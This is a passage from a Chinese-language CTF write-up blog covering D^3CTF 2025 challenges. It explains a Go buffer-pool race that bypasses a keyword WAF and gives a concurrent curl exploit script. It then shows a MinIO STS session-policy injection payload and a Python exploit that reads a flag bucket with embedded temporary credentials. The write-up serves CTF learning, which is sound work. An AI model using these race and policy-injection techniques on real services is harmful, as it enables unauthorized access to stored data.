		w<span class="token punctuation">.</span><span class="token function">WriteHeader</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">&#125;</span>

	<span class="token keyword">var</span> buf <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span>
	length <span class="token operator">:=</span> <span class="token function">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>ContentLength<span class="token punctuation">)</span>
	<span class="token keyword">if</span> length <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">var</span> err <span class="token builtin">error</span>
		buf<span class="token punctuation">,</span> err <span class="token operator">=</span> io<span class="token punctuation">.</span><span class="token function">ReadAll</span><span class="token punctuation">(</span><span class="token function">textInterrupterWrap</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>Body<span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">if</span> errors<span class="token punctuation">.</span><span class="token function">Is</span><span class="token punctuation">(</span>err<span class="token punctuation">,</span> ErrWAF<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				w<span class="token punctuation">.</span><span class="token function">WriteHeader</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span>
				<span class="token boolean">_</span><span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">=</span> w<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span><span class="token string">"WAF"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
			<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
				w<span class="token punctuation">.</span><span class="token function">WriteHeader</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span>
				<span class="token boolean">_</span><span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">=</span> w<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
			<span class="token punctuation">&#125;</span>
			<span class="token keyword">return</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
		buf <span class="token operator">=</span> p<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span>
		<span class="token keyword">defer</span> p<span class="token punctuation">.</span><span class="token function">Put</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span>
		rd <span class="token operator">:=</span> <span class="token function">textInterrupterWrap</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>Body<span class="token punctuation">)</span>
		i <span class="token operator">:=</span> <span class="token number">0</span>
		<span class="token keyword">for</span> <span class="token punctuation">&#123;</span>
			n<span class="token punctuation">,</span> err <span class="token operator">:=</span> rd<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span>i<span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
			<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
				<span class="token keyword">if</span> errors<span class="token punctuation">.</span><span class="token function">Is</span><span class="token punctuation">(</span>err<span class="token punctuation">,</span> io<span class="token punctuation">.</span>EOF<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
					<span class="token keyword">break</span>
				<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> errors<span class="token punctuation">.</span><span class="token function">Is</span><span class="token punctuation">(</span>err<span class="token punctuation">,</span> ErrWAF<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
					w<span class="token punctuation">.</span><span class="token function">WriteHeader</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span>
					<span class="token boolean">_</span><span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">=</span> w<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span><span class="token string">"WAF"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
					<span class="token keyword">return</span>
				<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
					w<span class="token punctuation">.</span><span class="token function">WriteHeader</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span>
					<span class="token boolean">_</span><span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">=</span> w<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
					<span class="token keyword">return</span>
				<span class="token punctuation">&#125;</span>
			<span class="token punctuation">&#125;</span>
			i <span class="token operator">+=</span> n
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">if</span> <span class="token operator">!</span>bytes<span class="token punctuation">.</span><span class="token function">HasPrefix</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span><span class="token string">"I want"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token boolean">_</span><span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">=</span> w<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span><span class="token string">"Sorry I'm not clear what you want."</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">&#125;</span>
	item <span class="token operator">:=</span> bytes<span class="token punctuation">.</span><span class="token function">TrimSpace</span><span class="token punctuation">(</span>bytes<span class="token punctuation">.</span><span class="token function">TrimPrefix</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span><span class="token string">"I want"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token keyword">if</span> bytes<span class="token punctuation">.</span><span class="token function">Equal</span><span class="token punctuation">(</span>item<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token boolean">_</span><span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">=</span> w<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span><span class="token function">Getenv</span><span class="token punctuation">(</span><span class="token string">"FLAG"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
		<span class="token boolean">_</span><span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">=</span> w<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">type</span> wrap <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>
	io<span class="token punctuation">.</span>ReadCloser
	ban <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span>
	idx <span class="token builtin">int</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">func</span> <span class="token punctuation">(</span>w <span class="token operator">*</span>wrap<span class="token punctuation">)</span> <span class="token function">Read</span><span class="token punctuation">(</span>p <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	n<span class="token punctuation">,</span> err <span class="token operator">:=</span> w<span class="token punctuation">.</span>ReadCloser<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span>
	<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>errors<span class="token punctuation">.</span><span class="token function">Is</span><span class="token punctuation">(</span>err<span class="token punctuation">,</span> io<span class="token punctuation">.</span>EOF<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">return</span> n<span class="token punctuation">,</span> err
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">if</span> p<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> w<span class="token punctuation">.</span>ban<span class="token punctuation">[</span>w<span class="token punctuation">.</span>idx<span class="token punctuation">]</span> <span class="token punctuation">&#123;</span>
			w<span class="token punctuation">.</span>idx<span class="token operator">++</span>
			<span class="token keyword">if</span> w<span class="token punctuation">.</span>idx <span class="token operator">==</span> <span class="token function">len</span><span class="token punctuation">(</span>w<span class="token punctuation">.</span>ban<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				<span class="token keyword">return</span> n<span class="token punctuation">,</span> ErrWAF
			<span class="token punctuation">&#125;</span>
		<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
			w<span class="token punctuation">.</span>idx <span class="token operator">=</span> <span class="token number">0</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">return</span> n<span class="token punctuation">,</span> err
<span class="token punctuation">&#125;</span>

<span class="token keyword">func</span> <span class="token function">textInterrupterWrap</span><span class="token punctuation">(</span>rc io<span class="token punctuation">.</span>ReadCloser<span class="token punctuation">)</span> io<span class="token punctuation">.</span>ReadCloser <span class="token punctuation">&#123;</span>
	<span class="token keyword">return</span> <span class="token operator">&amp;</span>wrap<span class="token punctuation">&#123;</span>
		rc<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>获取 flag 的方式是传入 <code>I want flag</code></p>
<p>waf 会拦截 flag</p>
<p>两个参数可控：buf 和 rd，分别对应 Content-Length 和请求体</p>
<p>而问题出在 buf 上，go 的题目特有的先看全局变量 <code>var p pool.BufferPool</code>，这是一个缓冲池</p>
<p>观察代码，在 http 通信中，如果 <code>Content-Length!=-1</code>(即没写CL头)，则不会调用这个缓冲区来读取数据，反之则会进入分支：</p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go">buf <span class="token operator">=</span> p<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span>
<span class="token keyword">defer</span> p<span class="token punctuation">.</span><span class="token function">Put</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>这里主要在于<code>defer p.Put(buf)</code>，观察代码上下文也没有对已经写入了body数据的buf缓冲区进行重置清零的操作，而是直接将她放回的缓冲池,这就会导致缓冲池会出现一个被污染的状态，下一次从缓冲池中取出缓冲区也会受到这些数据的影响</p>
<p>那么思路就是通过并发，让缓冲区保留原来的数据，然后让新写入的数据与原先保留在缓冲区的数据进行覆盖与拼接，从而构造 <code>I want flag</code></p>
<p>注：http2 和 http3 的区别</p>
<blockquote>
<p>http2在Content-Length比body实际长度大时，会等待一会儿的输入，来使两者相等，而http3则会更精准的检测出body的实际长度并且在body发送完毕之后迅速的发送结束流，也可以说是quic不会根据http请求包中的Content-Length来界定body的结束</p>
</blockquote>
<br>

<p>连deepseek都会做（</p>
<pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown"><span class="token list punctuation">1.</span> 污染请求触发 WAF 但污染缓冲池
<span class="token list punctuation">2.</span> 真实请求复用含 "flag" 的缓冲区
<span class="token list punctuation">3.</span> 前 7 字节被覆盖为 "I want "
<span class="token list punctuation">4.</span> 后续残留数据包含 "flag" 通过检查<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>先准备污染请求体</p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">xxxxxxxflag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>前 7 个 x 用于等会被覆盖</p>
<p>接下来并发污染请求体，中间打出真实请求覆盖缓冲区</p>
<p>exp.sh</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>

python <span class="token parameter variable">-c</span> <span class="token string">'print("x"*7 + "flag")'</span> <span class="token operator">></span> polluted_data.bin

<span class="token comment"># 发送污染请求（并行10个）</span>
<span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">..</span><span class="token number">10</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span class="token keyword">do</span>
  <span class="token function">curl</span> <span class="token parameter variable">-k</span> <span class="token parameter variable">-X</span> POST https://35.241.98.126:31258 <span class="token punctuation">\</span>
       <span class="token parameter variable">-H</span> <span class="token string">"Content-Length: 12"</span> <span class="token punctuation">\</span>
       --data-binary <span class="token string">"@polluted_data.bin"</span> <span class="token punctuation">\</span>
       --http3-only <span class="token operator">&amp;</span>
<span class="token keyword">done</span>

<span class="token comment"># 立即发送真实请求</span>
<span class="token function">sleep</span> <span class="token number">0.1</span>  <span class="token comment"># 微小延迟确保污染请求先发出</span>
<span class="token function">curl</span> --http3-only <span class="token parameter variable">-k</span> <span class="token parameter variable">-X</span> POST https://35.241.98.126:31258 <span class="token punctuation">\</span>
     <span class="token parameter variable">-H</span> <span class="token string">"Content-Length: 12"</span> <span class="token punctuation">\</span>
     <span class="token parameter variable">-d</span> <span class="token string">"I want "</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2025/05/30/D-3CTF-2025/image-20250601231537179.png" alt="image-20250601231537179"></p>
<hr>
<h1 id="d3invitation（复现）"><a href="#d3invitation（复现）" class="headerlink" title="d3invitation（复现）"></a>d3invitation（复现）</h1><p>一个 minio oss 端和一个 web 端，猜测 flag 在 oss 端里</p>
<p>web 端接口：</p>
<ul>
<li><p>&#x2F;invitation：生成邀请函</p>
</li>
<li><p>&#x2F;api&#x2F;genSTSCreds：传入 object_name ，生成 STS（Security Token Service）凭证 access_key_id、secret_access_key、session_token，用于临时授权客户端直接访问云存储服务中的 object_name 而无需使用永久凭证</p>
</li>
<li><p>&#x2F;api&#x2F;putObject：传入上面生成的凭证，往存储桶放 object</p>
</li>
<li><p>&#x2F;api&#x2F;getObject：读取桶下的 object</p>
</li>
</ul>
<p>jwt 解一下 session_token</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
  <span class="token property">"accessKey"</span><span class="token operator">:</span> <span class="token string">"40QBG10RGU7009EIY199"</span><span class="token punctuation">,</span>
  <span class="token property">"exp"</span><span class="token operator">:</span> <span class="token number">1748798073</span><span class="token punctuation">,</span>
  <span class="token property">"parent"</span><span class="token operator">:</span> <span class="token string">"B9M320QXHD38WUR2MIY3"</span><span class="token punctuation">,</span>
  <span class="token property">"sessionPolicy"</span><span class="token operator">:</span> <span class="token string">"eyJWZXJzaW9uIjoiMjAxMi0xMC0xNyIsIlN0YXRlbWVudCI6W3siRWZmZWN0IjoiQWxsb3ciLCJBY3Rpb24iOlsiczM6R2V0T2JqZWN0IiwiczM6UHV0T2JqZWN0Il0sIlJlc291cmNlIjpbImFybjphd3M6czM6OjpkM2ludml0YXRpb24vMi5wbmciXX1dfQ=="</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>sessionPolicy，这里是一个 AWS IAM 策略文档</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"Version"</span><span class="token operator">:</span><span class="token string">"2012-10-17"</span><span class="token punctuation">,</span><span class="token property">"Statement"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token property">"Effect"</span><span class="token operator">:</span><span class="token string">"Allow"</span><span class="token punctuation">,</span><span class="token property">"Action"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"s3:GetObject"</span><span class="token punctuation">,</span><span class="token string">"s3:PutObject"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token property">"Resource"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"arn:aws:s3:::d3invitation/2.png"</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>可以看到这里指定了授予权限，指向名为 <code>d3invitation</code> 的 S3 存储桶，赋予其中的 2.png 上传下载权限</p>
<p>flag 如果在 oss 中的话，我们就需要想办法伪造权限了</p>
<p>关于云安全的文章：<a target="_blank" rel="noopener" href="https://forum.butian.net/share/4340">https://forum.butian.net/share/4340</a></p>
<p>注意到 object_name 这里传入双引号时会返回 failed，说明存在注入，于是可以采用 RAM 策略注入</p>
<p><img src="/blog/2025/05/30/D-3CTF-2025/image-20250602175139719.png" alt="image-20250602175139719"></p>
<p>构造注入语句，赋予上传下载的权限，列出所有桶的权限，列出桶下目录的权限</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"object_name"</span><span class="token operator">:</span><span class="token string">"*\"]&#125;,&#123;\"Effect\":\"Allow\",\"Action\":[\"s3:GetObject\",\"s3:PutObject\",\"s3:ListBucket\",\"s3:ListAllMyBuckets\",\"s3:GetBucketLocation\"],\"Resource\":\"*\"&#125;]&#125;"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>此时的策略为：</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"Version"</span><span class="token operator">:</span><span class="token string">"2012-10-17"</span><span class="token punctuation">,</span>
 <span class="token property">"Statement"</span><span class="token operator">:</span><span class="token punctuation">[</span>
     <span class="token punctuation">&#123;</span><span class="token property">"Effect"</span><span class="token operator">:</span><span class="token string">"Allow"</span><span class="token punctuation">,</span>
      <span class="token property">"Action"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"s3:GetObject"</span><span class="token punctuation">,</span><span class="token string">"s3:PutObject"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
      <span class="token property">"Resource"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"arn:aws:s3:::d3invitation/*"</span><span class="token punctuation">]</span>
     <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
     <span class="token punctuation">&#123;</span><span class="token property">"Effect"</span><span class="token operator">:</span><span class="token string">"Allow"</span><span class="token punctuation">,</span>
      <span class="token property">"Action"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"s3:GetObject"</span><span class="token punctuation">,</span><span class="token string">"s3:PutObject"</span><span class="token punctuation">,</span><span class="token string">"s3:ListBucket"</span><span class="token punctuation">,</span><span class="token string">"s3:ListAllMyBuckets"</span><span class="token punctuation">,</span><span class="token string">"s3:GetBucketLocation"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
      <span class="token property">"Resource"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"*"</span><span class="token punctuation">]</span>
     <span class="token punctuation">&#125;</span>
 <span class="token punctuation">]</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2025/05/30/D-3CTF-2025/image-20250602190446086.png" alt="image-20250602190446086"></p>
<p>然后使用 python 作为客户端连接远程的 minio 服务进行读取</p>
<p>exp：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> minio <span class="token keyword">import</span> Minio
<span class="token keyword">from</span> minio<span class="token punctuation">.</span>error <span class="token keyword">import</span> S3Error

sts <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
  <span class="token string">"access_key_id"</span><span class="token punctuation">:</span> <span class="token string">"XN3N1HUJTII06D40I1AQ"</span><span class="token punctuation">,</span>
  <span class="token string">"secret_access_key"</span><span class="token punctuation">:</span> <span class="token string">"ozXdxylZ9gKEhV9r6QUgJ+yaPtRCLZ5DBdjf2bOb"</span><span class="token punctuation">,</span>
  <span class="token string">"session_token"</span><span class="token punctuation">:</span> <span class="token string">"eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhY2Nlc3NLZXkiOiJYTjNOMUhVSlRJSTA2RDQwSTFBUSIsImV4cCI6MTc0ODg2NTczMywicGFyZW50IjoiQjlNMzIwUVhIRDM4V1VSMk1JWTMiLCJzZXNzaW9uUG9saWN5IjoiZXlKV1pYSnphVzl1SWpvaU1qQXhNaTB4TUMweE55SXNJbE4wWVhSbGJXVnVkQ0k2VzNzaVJXWm1aV04wSWpvaVFXeHNiM2NpTENKQlkzUnBiMjRpT2xzaWN6TTZSMlYwVDJKcVpXTjBJaXdpY3pNNlVIVjBUMkpxWldOMElsMHNJbEpsYzI5MWNtTmxJanBiSW1GeWJqcGhkM002Y3pNNk9qcGtNMmx1ZG1sMFlYUnBiMjR2S2lKZGZTeDdJa1ZtWm1WamRDSTZJa0ZzYkc5M0lpd2lRV04wYVc5dUlqcGJJbk16T2tkbGRFSjFZMnRsZEV4dlkyRjBhVzl1SWl3aWN6TTZSMlYwVDJKcVpXTjBJaXdpY3pNNlRHbHpkRUZzYkUxNVFuVmphMlYwY3lJc0luTXpPa3hwYzNSQ2RXTnJaWFFpTENKek16cFFkWFJQWW1wbFkzUWlYU3dpVW1WemIzVnlZMlVpT2xzaUtpb2lYWDFkZlE9PSJ9.J2A7Yd4qDoR0dvHo73kmQJfHNZy6yEQ4AWBRJo6M4S7t0YZ9eINpIJ2gCg3Hf1NNEB6sozq2JupO_l8RTgwn_Q"</span>
<span class="token punctuation">&#125;</span>


<span class="token comment"># 配置MinIO客户端</span>
client <span class="token operator">=</span> Minio<span class="token punctuation">(</span>
    <span class="token string">"35.241.98.126:32749"</span><span class="token punctuation">,</span>
    access_key<span class="token operator">=</span>sts<span class="token punctuation">[</span><span class="token string">"access_key_id"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    secret_key<span class="token operator">=</span>sts<span class="token punctuation">[</span><span class="token string">"secret_access_key"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    session_token<span class="token operator">=</span>sts<span class="token punctuation">[</span><span class="token string">"session_token"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token comment"># 临时会话令牌</span>
    secure<span class="token operator">=</span><span class="token boolean">False</span>  <span class="token comment"># 设为False如果是HTTP</span>
<span class="token punctuation">)</span>

buckets <span class="token operator">=</span> client<span class="token punctuation">.</span>list_buckets<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"所有桶列表:"</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> bucket <span class="token keyword">in</span> buckets<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"- </span><span class="token interpolation"><span class="token punctuation">&#123;</span>bucket<span class="token punctuation">.</span>name<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nflag桶的文件:"</span><span class="token punctuation">)</span>
<span class="token keyword">try</span><span class="token punctuation">:</span>
    objects <span class="token operator">=</span> client<span class="token punctuation">.</span>list_objects<span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> obj <span class="token keyword">in</span> objects<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"- </span><span class="token interpolation"><span class="token punctuation">&#123;</span>obj<span class="token punctuation">.</span>object_name<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
<span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"错误: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n尝试列出d3invitation桶:"</span><span class="token punctuation">)</span>
<span class="token keyword">try</span><span class="token punctuation">:</span>
    objects <span class="token operator">=</span> client<span class="token punctuation">.</span>list_objects<span class="token punctuation">(</span><span class="token string">"d3invitation"</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> obj <span class="token keyword">in</span> objects<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span>object_name<span class="token punctuation">)</span>
<span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"错误: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>  <span class="token comment"># 将收到Access Denied</span>

<span class="token keyword">try</span><span class="token punctuation">:</span>
    <span class="token comment"># client.fput_object("flag", "report.pdf", "/local/report.pdf")</span>
    client<span class="token punctuation">.</span>fget_object<span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">,</span> <span class="token string">"flag"</span><span class="token punctuation">,</span> <span class="token string">"1.txt"</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"下载完成"</span><span class="token punctuation">)</span>
<span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"错误: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2025/05/30/D-3CTF-2025/image-20250602190549494.png" alt="image-20250602190549494"></p>
<hr>
<h1 id="d3jtar（复现）"><a href="#d3jtar（复现）" class="headerlink" title="d3jtar（复现）"></a>d3jtar（复现）</h1><p>给了个 war 包，直接放在 tomcat 部署就好</p>
<p>如题，重点明显是在这个 jtar-2.3 上，先看 controller</p>
<p>提供了三个路由：</p>
<ul>
<li><p>&#x2F;view</p>
